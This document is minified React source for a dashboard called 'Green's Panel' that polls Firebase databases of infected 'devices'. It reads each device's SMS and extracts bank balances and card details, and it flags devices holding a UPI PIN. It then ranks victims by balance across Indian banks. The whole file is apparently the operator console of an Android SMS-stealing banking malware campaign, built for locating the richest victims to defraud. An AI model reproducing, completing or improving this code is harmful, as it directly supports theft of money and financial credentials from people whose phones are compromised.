function p1({
    fbUrl: A,
    fbKey: tt,
    connections: multiConnections,
    onLogout: b
}) {
    const [firebaseSources, setFirebaseSources] = jt.useState(() => (multiConnections?.length ? multiConnections : [{ url: A, key: tt }]).filter(source => source && typeof source.url === "string" && source.url.trim())), isMultiFirebase = firebaseSources.length > 1, sourcesRef = jt.useRef(firebaseSources);
    sourcesRef.current = firebaseSources;
    const [d, S] = jt.useState([]), [f, p] = jt.useState(!0), [h, o] = jt.useState(!1), [x, T] = jt.useState(null), [w, C] = jt.useState("online"), [v, E] = jt.useState("balance"), [g, z] = jt.useState(""), [N, k] = jt.useState(""), [M, H] = jt.useState(""), [L, nt] = jt.useState(new Date), [balanceScope, setBalanceScope] = jt.useState("online"), [selectedBank, setSelectedBank] = jt.useState(""), [firebaseScope, setFirebaseScope] = jt.useState("online"), [selectedFirebase, setSelectedFirebase] = jt.useState(""), [selectedFirebaseBank, setSelectedFirebaseBank] = jt.useState(""), [quickAddOpen, setQuickAddOpen] = jt.useState(!1), [quickUrl, setQuickUrl] = jt.useState(""), [quickKey, setQuickKey] = jt.useState(""), [quickBusy, setQuickBusy] = jt.useState(!1), V = jt.useRef(0), ot = jt.useRef(null), $ = jt.useRef(null), ht = jt.useRef(new Set), smsScanBusy = jt.useRef(!1), connectionRefreshBusy = jt.useRef(!1), smsScanTick = jt.useRef(0), smsLatestRef = jt.useRef(new Map), devicesRef = jt.useRef(d), xt = jt.useCallback(U => {
        k(U), setTimeout(() => k(""), 5000)
    }, []), D = jt.useCallback(async (U, J) => {
        try {
            const sourceUrl = J?._fbUrl || A, sourceKey = J?._fbKey || tt, sourceDeviceId = J?.sourceDeviceId || U, cacheKey = `${sourceUrl}|${sourceDeviceId}`, cached = smsAnalysisCache.get(cacheKey);
            let St;
            if (cached && Date.now()-cached.time < 1500) St = cached.analysis;
            else {
                const ut = await yn(sourceUrl, sourceKey, `messages/${sourceDeviceId}`, { orderBy: '"$key"', limitToLast: "150" });
                const messages = Gu(ut), latest = messages[0], latestKey = latest ? `${latest.sender}|${latest.time}|${latest.text}` : "", previousKey = smsLatestRef.current.get(cacheKey);
                latestKey && smsLatestRef.current.set(cacheKey,latestKey), St = Xu(messages)
            }
            St = sanitizeSmsAnalysis(St), smsAnalysisCache.set(cacheKey,{ time:Date.now(), analysis:St });
            S(yt => yt.map(Yt => Yt.id === U ? { ...Yt,
                smsAnalysis: St
            } : Yt)), T(yt => yt ?.id === U ? { ...yt,
                smsAnalysis: St
            } : yt), ht.current.add(U)
        } catch {
            ht.current.add(U)
        }
        return J
    }, [A, tt, xt]), at = jt.useCallback(async (U = !1) => {
        if (connectionRefreshBusy.current) return;
        connectionRefreshBusy.current = !0;
        try {
            const activeSources = sourcesRef.current, multipleSources = activeSources.length > 1, sourceResults = await Promise.allSettled(activeSources.map(J => yn(J.url, J.key, "clients"))), failed = sourceResults.filter(J => J.status === "rejected");
            if (activeSources.length === 0) return S([]), H(""), p(!1), void 0;
            if (failed.length === sourceResults.length) throw failed[0].reason;
            const ut = sourceResults.flatMap((J, sourceIndex) => J.status === "fulfilled" ? n1(J.value).map(sourceDevice => ({
                ...sourceDevice,
                sourceDeviceId: sourceDevice.id,
                id: multipleSources ? `${sourceIndex}:${sourceDevice.id}` : sourceDevice.id,
                _fbUrl: activeSources[sourceIndex].url,
                _fbKey: activeSources[sourceIndex].key,
                firebaseLabel: multipleSources ? maskFirebase(activeSources[sourceIndex].url) : ""
            })) : []);
            S(St => {
                const yt = new Map(St.map(Mt => [Mt.id, Mt]));
                return ut.map(Mt => ({ ...Mt,
                    smsAnalysis: sanitizeSmsAnalysis(yt.get(Mt.id) ?.smsAnalysis)
                }))
            }), H(""), p(!1);
            const _t = ut.map(St => St.id).filter(St => !ht.current.has(St));
            if (_t.length > 0) {
                U || o(!0);
                _t.forEach(St => ht.current.add(St)), smsScanBusy.current = !0;
                (async () => {
                    try {
                        const St = [];
                        for (let yt = 0; yt < _t.length; yt += 20) St.push(_t.slice(yt, yt + 20));
                        for (const yt of St) {
                            const Yt = ut.filter(Mt => yt.includes(Mt.id));
                            await Promise.all(yt.map((Mt, ve) => D(Mt, Yt[ve])))
                        }
                    } finally { smsScanBusy.current = !1, U || o(!1) }
                })()
            }
            V.current > 0 && ut.length > V.current && xt("🔔 New device connected!"), V.current = ut.length
        } catch (J) {
            p(!1);
            const ut = J instanceof Error ? J.message : String(J);
            ut.includes("PERMISSION_DENIED") || ut.includes("401") || ut.includes("403") ? H("Firebase Permission Denied — Your API key is rejected. Go to Firebase Console → Project Settings → Service Accounts → Database Secrets and copy the secret key. That secret (not the API key starting with AIza...) is what works here. Also ensure Firebase Realtime Database Rules allow read.") : ut.includes("NOT_FOUND") || ut.includes("404") ? H("Database path not found. Check your Firebase URL is correct.") : H(`Connection error: ${ut.slice(0,120)}`)
        } finally { connectionRefreshBusy.current = !1 }
    }, [A, tt, D, xt]), c = jt.useCallback(async () => {
        if (smsScanBusy.current) return;
        smsScanTick.current += 1;
        const U = devicesRef.current.filter(dev => dev.status || smsScanTick.current % 5 === 0);
        if (U.length !== 0) try {
            smsScanBusy.current = !0;
            for (let J = 0; J < U.length; J += 20) {
                const ut = U.slice(J, J + 20);
                await Promise.all(ut.map(_t => D(_t.id, _t)))
            }
        } finally { smsScanBusy.current = !1 }
    }, [D]), I = jt.useCallback(() => at(!1), [at]);
    devicesRef.current = d;
    jt.useEffect(() => {
        at(!1), ot.current = setInterval(() => at(!0), 3e3), $.current = setInterval(c, 2e3);
        const U = setInterval(() => nt(new Date), 1e3);
        return () => {
            ot.current && clearInterval(ot.current), $.current && clearInterval($.current), clearInterval(U)
        }
    }, []);
    jt.useEffect(() => {
        const U = () => T(null);
        window.addEventListener("popstate", U);
        return () => window.removeEventListener("popstate", U)
    }, []);
    const quickAddFirebase = async () => {
            const url = normalizeFirebaseUrl(quickUrl), key = optionalFirebaseKey(quickKey);
            if (!/^https:\/\/[a-z0-9-]+(?:-default-rtdb)?\.firebaseio\.com$/i.test(url)) return xt("Enter a valid Firebase URL");
            if (sourcesRef.current.some(source => source.url === url)) return xt("Firebase already connected");
            setQuickBusy(!0);
            try {
                await yn(url, key, "clients");
                const item = { id: Date.now(), url, key, date: new Date().toLocaleString() }, next = [...sourcesRef.current, item];
                sourcesRef.current = next, setFirebaseSources(next);
                const saved = Yp();
                saved.some(source => source.url === url) || nh([...saved, item]);
                setQuickUrl(""), setQuickKey(""), setQuickAddOpen(!1), xt("Firebase connected");
                setTimeout(() => at(!1), 0)
            } catch { xt("Firebase connection failed — check URL or database access") }
            finally { setQuickBusy(!1) }
        },
        removeFirebase = url => {
            if (!confirm("Remove this Firebase connection?")) return;
            const next = sourcesRef.current.filter(source => source.url !== url);
            sourcesRef.current = next, setFirebaseSources(next), nh(Yp().filter(source => source.url !== url)), S(devices => devices.filter(device => (device._fbUrl || A) !== url));
            selectedFirebase === url && (setSelectedFirebase(""), setSelectedFirebaseBank("")), w === "balances" && next.length < 2 && C("firebase"), xt("Firebase removed")
        },
        Z = async () => {
            confirm("Logout from current account?") && b()
        },
        q = U => {
            window.history.pushState({ ...window.history.state, GreenDevicePanel: !0 }, "", window.location.href), T(U)
        },
        mt = d.filter(U => {
            if (w === "online" && !U.status || w === "offline" && U.status || w === "upi" && !U.upipin || w === "bank" && !U.smsAnalysis ?.bankBalances.length || w === "card" && !U.smsAnalysis ?.cards.length) return !1;
            const J = g.toLowerCase();
            return !(J && !U.name.toLowerCase().includes(J) && !U.phoneNumber.includes(J) && !U.id.includes(J))
        }).sort((U, J) => {
            if (U.status !== J.status) return U.status ? -1 : 1;
            const balanceOf = St => Math.max(0, ...(St.smsAnalysis?.bankBalances||[]).map(yt => Number(String(yt.availableBalance||0).replace(/[^0-9.-]/g,""))||0));
            return v === "balance" ? balanceOf(J)-balanceOf(U) : v === "name" ? U.name.localeCompare(J.name) : v === "battery" ? J.batteryPercent - U.batteryPercent : v === "old" ? U.id.localeCompare(J.id) : J.id.localeCompare(U.id)
        }),
        it = d.filter(U => U.status).length,
        bt = d.length - it,
        y = d.filter(U => U.smsAnalysis ?.bankBalances.length).length,
        _ = d.filter(U => U.smsAnalysis ?.cards.length).length,
        bankSummary = jt.useMemo(() => {
            const U = new Map;
            d.filter(J => balanceScope === "all" || J.status).forEach(J => {
                const seen = new Set;
                (J.smsAnalysis?.bankBalances||[]).filter(St => !isBlockedBankLabel([St.bankName,St.senderName,St.rawSms].filter(Boolean).join(" "))).forEach(St => {
                    const bank = St.bankName || "Unknown Bank", account = `${bank}|${St.accountLast4||J.id}`;
                    if (seen.has(account)) return;
                    seen.add(account);
                    const amount = Number(String(St.availableBalance||0).replace(/[^0-9.-]/g,""))||0, current = U.get(bank)||{ bankName:bank, total:0, accounts:0, entries:[] };
                    current.total += amount, current.accounts += 1, current.entries.push({ dev:J, balance:amount, last4:St.accountLast4||"—" }), U.set(bank,current)
                })
            });
            const priority = [
                "sbi", "hdfc", "uco", "pnb", "kotak", "ippb", "ipbms",
                "bank of india", "icici", "bank of baroda", "bob", "axis", "idfc",
                "airtel payment", "airtel payments", "allahabad", "aub", "j&k", "jk bank", "canara"
            ];
            U.forEach(current => current.entries.sort((J,St)=>J.dev.status!==St.dev.status?(J.dev.status?-1:1):St.balance-J.balance));
            return [...U.values()].sort((J,St) => {
                const rank = bank => {
                    const name = bank.toLowerCase();
                    const index = priority.findIndex(item => name.includes(item));
                    return index < 0 ? 999 : index
                }, jr = rank(J.bankName), sr = rank(St.bankName);
                return jr !== sr ? jr-sr : St.total-J.total
            })
        }, [d,balanceScope]),
        firebaseSummary = jt.useMemo(() => {
            const sources = new Map(firebaseSources.map(source => [source.url, { url:source.url, label:maskFirebase(source.url), total:0, totalConnections:0, onlineConnections:0, banks:new Map }]));
            d.forEach(dev => {
                const source = sources.get(dev._fbUrl||A) || { url:dev._fbUrl||A, label:maskFirebase(dev._fbUrl||A), total:0, totalConnections:0, onlineConnections:0, banks:new Map };
                source.totalConnections += 1, dev.status && (source.onlineConnections += 1);
                if (firebaseScope === "all" || dev.status) {
                    const seen = new Set;
                    (dev.smsAnalysis?.bankBalances||[]).filter(balance => !isBlockedBankLabel([balance.bankName,balance.senderName,balance.rawSms].filter(Boolean).join(" "))).forEach(balance => {
                        const bankName = balance.bankName||"Unknown Bank", account = `${bankName}|${balance.accountLast4||dev.id}`;
                        if (seen.has(account)) return;
                        seen.add(account);
                        const amount = Number(String(balance.availableBalance||0).replace(/[^0-9.-]/g,""))||0, bank = source.banks.get(bankName)||{ bankName, total:0, accounts:0, entries:[] };
                        bank.total += amount, bank.accounts += 1, bank.entries.push({ dev, balance:amount, last4:balance.accountLast4||"—" }), source.banks.set(bankName,bank), source.total += amount
                    })
                }
                sources.set(source.url,source)
            });
            return [...sources.values()].map(source => ({ ...source, banks:[...source.banks.values()].map(bank => ({ ...bank, entries:bank.entries.sort((J,St)=>J.dev.status!==St.dev.status?(J.dev.status?-1:1):St.balance-J.balance) })).sort((J,St)=>St.total-J.total) })).sort((J,St)=>St.total-J.total)
        }, [d,firebaseScope,A,firebaseSources]),
        X = L.toLocaleTimeString("en-IN", {
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
            hour12: !1,
            timeZone: "Asia/Kolkata"
        });
    return r.jsxs("div", {
        className: "min-h-screen bg-[#080808] text-white flex flex-col",
        children: [r.jsx("header", {
            className: "sticky top-0 z-40 bg-[#0a0a0a]/95 backdrop-blur-md border-b border-[#1a1a1a]",
            children: r.jsxs("div", {
                className: "dashboard-header-inner max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-4",
                children: [r.jsxs("div", {
                    onClick: b,
                    onKeyDown: U => (U.key === "Enter" || U.key === " ") && b(),
                    role: "link",
                    tabIndex: 0,
                    title: "Go to home",
                    className: "console-brand flex items-center gap-2.5 flex-shrink-0",
                    children: [r.jsx("div", {
                        className: "Green-logo Green-logo--header",
                        children: r.jsx("img", {
                            src: "img.png",
                            alt: "Green logo",
                            decoding: "async",
                            fetchPriority: "high"
                        })
                    }), r.jsx("span", {
                        className: "relative animate-fade-in",
                        children: "Green's Panel"
                    }), r.jsx("style", {
                        jsx: !0,
                        children: "@keyframes fadeIn{0%{opacity:0;transform:translateY(10px)scale(0.98);filter:blur(2px)}100%{opacity:1;transform:translateY(0)scale(1);filter:blur(0)}}.animate-fade-in{animation:fadeIn 1s ease-out forwards}@keyframes glint{0%,100%{transform:scale(1);opacity:0}50%{transform:scale(1.5);opacity:1}}.animate-glint{animation:glint 1.5s infinite;box-shadow:0 0 6px #6acfff,0 0 10px #0088cc}"
                    })]
                }), r.jsxs("div", {
                    className: "relative flex-1 max-w-sm",
                    children: [r.jsx(xp, {
                        className: "absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#444]"
                    }), r.jsx("input", {
                        type: "text",
                        value: g,
                        onChange: U => z(U.target.value),
                        placeholder: "Search devices...",
                        className: "w-full pl-9 pr-4 py-2 rounded-xl bg-[#111] border border-[#222] focus:border-[#333] outline-none text-sm text-white placeholder:text-[#444] transition-all"
                    })]
                }), r.jsxs("div", {
                    className: "dashboard-header-actions ml-auto flex items-center gap-3",
                    children: [r.jsxs("div", {
                        className: "connection-status flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-950/40 border border-emerald-900/40",
                        children: [r.jsx("span", {
                            className: "w-2 h-2 rounded-full bg-emerald-500",
                            style: {
                                boxShadow: "0 0 6px #22c55e"
                            }
                        }), r.jsx("span", {
                            className: "text-xs font-semibold text-emerald-400",
                            children: "Connected"
                        })]
                    }), r.jsxs("div", {
                        className: "india-live-clock flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-[#111] border border-[#1e1e1e]",
                        children: [r.jsx(I0, {
                            className: "w-3.5 h-3.5 text-[#555]"
                        }), r.jsx("span", {
                            className: "text-xs font-mono font-bold text-[#888]",
                            children: X
                        }), r.jsx("span", {
                            className: "india-live-clock__zone",
                            children: "IST"
                        })]
                    }), r.jsxs("button", {
                        onClick: Z,
                        className: "flex items-center gap-2 px-3 py-1.5 rounded-xl border border-[#222] bg-[#111] text-xs text-[#666] hover:text-red-400 hover:border-red-900/40 transition-all",
                        children: [r.jsx(fp, {
                            className: "w-3.5 h-3.5"
                        }), "Logout"]
                    })]
                })]
            })
        }), M && r.jsx(h1, {
            message: M,
            onDismiss: () => H("")
        }), r.jsx("div", {
            className: "console-toolbar border-b border-[#1a1a1a] bg-[#0a0a0a]",
            children: r.jsxs("div", {
                className: "max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-6 flex-wrap",
                children: [r.jsxs("div", {
                    className: "console-metric-chips flex items-center gap-5",
                    children: [r.jsxs("div", {
                        className: "console-metric-chip metric-total",
                        children: [r.jsx("i", { className: "fa-solid fa-layer-group metric-chip-icon", "aria-hidden": "true" }), r.jsx("div", { children: [r.jsx("p", {
                            className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
                            children: "Total"
                        }), r.jsx("p", {
                            className: "text-lg font-black text-red-500",
                            children: d.length
                        })] })]
                    }), r.jsxs("div", {
                        className: "console-metric-chip metric-online",
                        children: [r.jsx("i", { className: "fa-solid fa-signal metric-chip-icon", "aria-hidden": "true" }), r.jsx("div", { children: [r.jsx("p", {
                            className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
                            children: "Online"
                        }), r.jsx("p", {
                            className: "text-lg font-black text-emerald-400",
                            children: it
                        })] })]
                    }), r.jsxs("div", {
                        className: "console-metric-chip metric-offline",
                        children: [r.jsx("i", { className: "fa-solid fa-power-off metric-chip-icon", "aria-hidden": "true" }), r.jsx("div", { children: [r.jsx("p", {
                            className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
                            children: "Offline"
                        }), r.jsx("p", {
                            className: "text-lg font-black text-[#555]",
                            children: bt
                        })] })]
                    }), r.jsxs("div", {
                        className: "console-metric-chip metric-bank",
                        children: [r.jsx("i", { className: "fa-solid fa-building-columns metric-chip-icon", "aria-hidden": "true" }), r.jsx("div", { children: [r.jsx("p", {
                            className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
                            children: "Bank SMS"
                        }), r.jsx("p", {
                            className: "text-lg font-black text-emerald-400",
                            children: y
                        })] })]
                    }), _ > 0 && r.jsxs("div", {
                        className: "console-metric-chip metric-cards",
                        children: [r.jsx("i", { className: "fa-solid fa-credit-card metric-chip-icon", "aria-hidden": "true" }), r.jsx("div", { children: [r.jsx("p", {
                            className: "text-[9px] uppercase tracking-widest text-[#444] font-semibold",
                            children: "Cards"
                        }), r.jsx("p", {
                            className: "text-lg font-black text-purple-400",
                            children: _
                        })] })]
                    })]
                }), r.jsxs("div", {
                    className: "ml-auto flex items-center gap-2 flex-wrap",
                    children: [
                        ["all", "online", "offline", "upi", "bank", "card", ...(isMultiFirebase ? ["balances"] : []), "firebase"].map(U => r.jsx("button", {
                            onClick: () => C(U),
                            className: `px-3 py-1.5 rounded-lg text-xs font-semibold capitalize transition-all ${w===U?U==="bank"||U==="balances"?"bg-emerald-600/20 text-emerald-400 border border-emerald-600/30":U==="card"?"bg-purple-600/20 text-purple-400 border border-purple-600/30":"bg-red-600/20 text-red-400 border border-red-600/30":"text-[#555] hover:text-[#888]"}`,
                            children: U === "balances" ? "Balances" : U === "firebase" ? "Firebase Summary" : U
                        }, U)), r.jsx("div", {
                            className: "w-px h-4 bg-[#222]"
                        }), r.jsxs("select", {
                            value: v,
                            onChange: U => E(U.target.value),
                            className: "bg-[#111] border border-[#222] text-xs text-[#666] rounded-lg px-2 py-1.5 outline-none",
                            children: [r.jsx("option", {
                                value: "balance",
                                children: "Balance: High to Low"
                            }), r.jsx("option", {
                                value: "new",
                                children: "Newest"
                            }), r.jsx("option", {
                                value: "old",
                                children: "Oldest"
                            }), r.jsx("option", {
                                value: "name",
                                children: "Name"
                            }), r.jsx("option", {
                                value: "battery",
                                children: "Battery"
                            })]
                        }), r.jsx("button", {
                            onClick: I,
                            className: "p-2 rounded-lg bg-[#111] border border-[#222] text-[#555] hover:text-[#888] hover:border-[#333] transition-all",
                            children: r.jsx(ys, {
                                className: "w-3.5 h-3.5"
                            })
                        })
                    ]
                })]
            })
        }), r.jsx("main", {
            className: "flex-1 max-w-screen-2xl mx-auto w-full px-6 py-6",
            children: f ? r.jsxs("div", {
                children: [r.jsxs("div", {
                    className: "flex items-center gap-3 mb-5",
                    children: [r.jsx("div", {
                        className: "w-4 h-4 border-2 border-[#333] border-t-red-500 rounded-full animate-spin"
                    }), r.jsx("span", {
                        className: "text-sm text-[#555]",
                        children: "Connecting to Firebase…"
                    })]
                }), r.jsx("div", {
                    className: "grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4",
                    children: Array.from({
                        length: 6
                    }).map((U, J) => r.jsx(m1, {}, J))
                })]
            }) : w === "firebase" ? r.jsxs("section", {
                className: "firebase-summary-section",
                children: [r.jsxs("div", {
                    className: "firebase-summary-head",
                    children: [r.jsxs("div", { children: [r.jsx("h2", { children: "Firebase Balance Summary" }), r.jsx("p", { children: firebaseScope === "online" ? "Balance from online connections only" : "Balance from all connections" })] }), r.jsxs("div", {
                        className: "firebase-summary-actions",
                        children: [r.jsx("button", { className: "quick-add-firebase-toggle", onClick: () => setQuickAddOpen(!quickAddOpen), children: quickAddOpen ? "× Close" : "+ New Firebase" }), r.jsxs("div", { className: "balance-scope-toggle",
                        children: [r.jsx("button", { className: firebaseScope === "online" ? "active" : "", onClick: () => { setFirebaseScope("online"), setSelectedFirebase(""), setSelectedFirebaseBank("") }, children: "Online" }), r.jsx("button", { className: firebaseScope === "all" ? "active" : "", onClick: () => { setFirebaseScope("all"), setSelectedFirebase(""), setSelectedFirebaseBank("") }, children: "All" })]
                        })]
                    })]
                }), quickAddOpen && r.jsxs("div", { className: "quick-add-firebase-form", children: [r.jsx("input", { value:quickUrl, onChange:U=>setQuickUrl(U.target.value), onKeyDown:U=>U.key==="Enter"&&!quickBusy&&quickAddFirebase(), placeholder:"https://project-default-rtdb.firebaseio.com", "aria-label":"Firebase URL" }), r.jsx("input", { type:"password", value:quickKey, onChange:U=>setQuickKey(U.target.value), onKeyDown:U=>U.key==="Enter"&&!quickBusy&&quickAddFirebase(), placeholder:"Secret key (optional)", "aria-label":"Firebase secret key" }), r.jsx("button", { onClick:quickAddFirebase, disabled:quickBusy, children:quickBusy?"Connecting…":"Connect Firebase" })] }), r.jsx("div", {
                    className: "firebase-summary-grid",
                    children: firebaseSummary.length ? firebaseSummary.map(U => r.jsxs("div", {
                        className: `firebase-summary-card-shell ${selectedFirebase===U.url?"selected":""}`,
                        children: [r.jsxs("button", { className:"firebase-summary-card-main", onClick: () => { setSelectedFirebase(selectedFirebase===U.url?"":U.url), setSelectedFirebaseBank("") }, children: [r.jsxs("div", { children: [r.jsx("strong", { children: `Firebase · ${U.label}` }), r.jsxs("span", { children: [U.onlineConnections, " online / ", U.totalConnections, " total"] })] }), r.jsxs("b", { children: ["₹", Pl(U.total)] })] }), r.jsx("button", { className:"firebase-summary-remove", title:"Remove Firebase", "aria-label":`Remove ${U.label}`, onClick:()=>removeFirebase(U.url), children:"×" })]
                    }, U.url)) : r.jsxs("div", { className:"firebase-summary-empty", children:[r.jsx("strong",{children:"No Firebase connected"}),r.jsx("span",{children:"Use + New Firebase to connect one without leaving this page."})] })
                }), selectedFirebase && (() => {
                    const U = firebaseSummary.find(J => J.url===selectedFirebase);
                    return U ? r.jsxs("div", {
                        className: "firebase-bank-panel",
                        children: [r.jsxs("div", { className: "firebase-bank-panel-head", children: [r.jsxs("div", { children: [r.jsx("strong", { children: `Firebase · ${U.label}` }), r.jsx("span", { children: "Select a bank to view connections" })] }), r.jsx("button", { onClick:()=>{setSelectedFirebase(""),setSelectedFirebaseBank("")}, children:"Close" })] }), U.banks.length ? r.jsx("div", {
                            className: "firebase-bank-grid",
                            children: U.banks.map(J => r.jsxs("button", { className:selectedFirebaseBank===J.bankName?"selected":"", onClick:()=>setSelectedFirebaseBank(selectedFirebaseBank===J.bankName?"":J.bankName), children:[r.jsx("span",{children:J.bankName}),r.jsxs("strong",{children:["₹",Pl(J.total)]}),r.jsxs("small",{children:[J.accounts," account",J.accounts===1?"":"s"]})] },J.bankName))
                        }) : r.jsx("p", { className:"bank-consolidated-empty", children:"No bank balance detected for this Firebase" }), selectedFirebaseBank && (()=>{
                            const J=U.banks.find(St=>St.bankName===selectedFirebaseBank);
                            return J ? r.jsx("div", { className:"bank-account-list firebase-account-list", children:J.entries.map((St,yt)=>r.jsxs("button",{onClick:()=>q(St.dev),children:[r.jsxs("div",{children:[r.jsx("strong",{children:St.dev.name}),r.jsxs("span",{children:["A/c ••",St.last4," · ",St.dev.status?"Online":"Offline"]})]}),r.jsxs("b",{children:["₹",Pl(St.balance)]})]},`${St.dev.id}-${St.last4}-${yt}`)) }) : null
                        })()]
                    }) : null
                })()]
            }) : w === "balances" && isMultiFirebase ? r.jsxs("section", {
                className: "bank-consolidated-wrap bank-consolidated-section",
                children: [r.jsxs("div", {
                    className: "bank-consolidated-head",
                    children: [r.jsxs("div", {
                        children: [r.jsx("h2", { children: "Consolidated Bank Balance" }), r.jsx("p", { children: balanceScope === "online" ? "Balances from online connections only" : "Balances across all Firebase connections" })]
                    }), r.jsxs("div", {
                        className: "balance-head-actions",
                        children: [r.jsxs("div", {
                            className: "balance-scope-toggle",
                            children: [r.jsx("button", {
                                className: balanceScope === "online" ? "active" : "",
                                onClick: () => { setBalanceScope("online"), setSelectedBank("") },
                                children: "Online"
                            }), r.jsx("button", {
                                className: balanceScope === "all" ? "active" : "",
                                onClick: () => { setBalanceScope("all"), setSelectedBank("") },
                                children: "All"
                            })]
                        }), r.jsx("span", { className: "balance-firebase-count", children: `${firebaseSources.length} Firebase` })]
                    })]
                }), bankSummary.length ? r.jsx("div", {
                    className: "bank-consolidated-grid",
                    children: bankSummary.map(U => r.jsxs(r.Fragment, {
                        children: [r.jsxs("button", {
                            className: `bank-consolidated-card ${selectedBank===U.bankName?"selected":""}`,
                            onClick: () => setSelectedBank(selectedBank === U.bankName ? "" : U.bankName),
                            children: [r.jsx("span", { children: U.bankName }), r.jsxs("strong", { children: ["₹", Pl(U.total)] }), r.jsxs("small", { children: [U.accounts, " account", U.accounts===1?"":"s"] })]
                        }), selectedBank === U.bankName && r.jsxs("div", {
                            className: "bank-account-panel bank-account-panel--inline",
                            children: [r.jsxs("div", {
                                className: "bank-account-panel-head",
                                children: [r.jsxs("div", { children: [r.jsx("strong", { children: U.bankName }), r.jsxs("span", { children: [U.accounts, " connection", U.accounts===1?"":"s"] })] }), r.jsx("button", { onClick: () => setSelectedBank(""), children: "Close" })]
                            }), r.jsx("div", {
                                className: "bank-account-list",
                                children: U.entries.map((J,St) => r.jsxs("button", {
                                    onClick: () => q(J.dev),
                                    children: [r.jsxs("div", { children: [r.jsx("strong", { children: J.dev.name }), r.jsxs("span", { children: ["A/c ••", J.last4, J.dev.firebaseLabel ? ` · ${J.dev.firebaseLabel}` : ""] })] }), r.jsxs("b", { children: ["₹", Pl(J.balance)] })]
                                }, `${J.dev.id}-${J.last4}-${St}`))
                            })]
                        })]
                    }, U.bankName))
                }) : r.jsx("p", { className: "bank-consolidated-empty", children: h ? "Reading bank SMS…" : "No bank balance detected yet" })]
            }) : d.length === 0 ? r.jsxs("div", {
                className: "flex flex-col items-center justify-center py-24 text-center",
                children: [r.jsx("div", {
                    className: "w-16 h-16 rounded-2xl bg-[#111] border border-[#1e1e1e] flex items-center justify-center mb-5",
                    children: r.jsx(gs, {
                        className: "w-8 h-8 text-[#2a2a2a]"
                    })
                }), r.jsx("p", {
                    className: "text-base font-bold text-[#444]",
                    children: "No devices connected"
                }), r.jsx("p", {
                    className: "text-sm text-[#333] mt-1.5 mb-5",
                    children: "Waiting for devices to register…"
                }), r.jsxs("div", {
                    className: "flex items-center gap-2 px-4 py-2 rounded-full bg-[#111] border border-[#1e1e1e]",
                    children: [r.jsx("div", {
                        className: "w-2 h-2 rounded-full bg-red-500 animate-pulse"
                    }), r.jsx("span", {
                        className: "text-xs text-[#555]",
                        children: "Auto-refreshing every 15s"
                    })]
                })]
            }) : r.jsxs("div", {
                children: [h && r.jsxs("div", {
                    className: "flex items-center gap-2 mb-4 px-3 py-2 rounded-xl bg-[#111] border border-[#1e1e1e] w-fit",
                    children: [r.jsx("div", {
                        className: "w-3 h-3 border-2 border-[#333] border-t-emerald-500 rounded-full animate-spin"
                    }), r.jsx("span", {
                        className: "text-xs text-[#555]",
                        children: "Loading SMS data…"
                    })]
                }), r.jsxs("div", {
                    className: "grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4",
                    children: [mt.map(U => r.jsx(f1, {
                        dev: U,
                        onClick: () => q(U)
                    }, U.id)), mt.length === 0 && r.jsx("div", {
                        className: "col-span-full py-16 text-center",
                        children: r.jsx("p", {
                            className: "text-sm text-[#444]",
                            children: "No devices match your filter"
                        })
                    })]
                })]
            })
        }), N && r.jsx("div", {
            className: "notification-toast fixed bottom-5 right-5 z-50 px-5 py-3 rounded-2xl text-sm font-semibold shadow-xl animate-slide-in",
            style: {
                zIndex: 70
            },
            role: "status",
            "aria-live": "polite",
            children: N
        }), x && r.jsx(d1, {
            dev: x,
            fbUrl: x._fbUrl || A,
            fbKey: x._fbKey || tt,
            onClose: () => window.history.state?.GreenDevicePanel ? window.history.back() : T(null),
            onDelete: () => {
                window.history.state?.GreenDevicePanel ? window.history.back() : T(null), I()
            },
            showToast: xt
        })]
    })
}

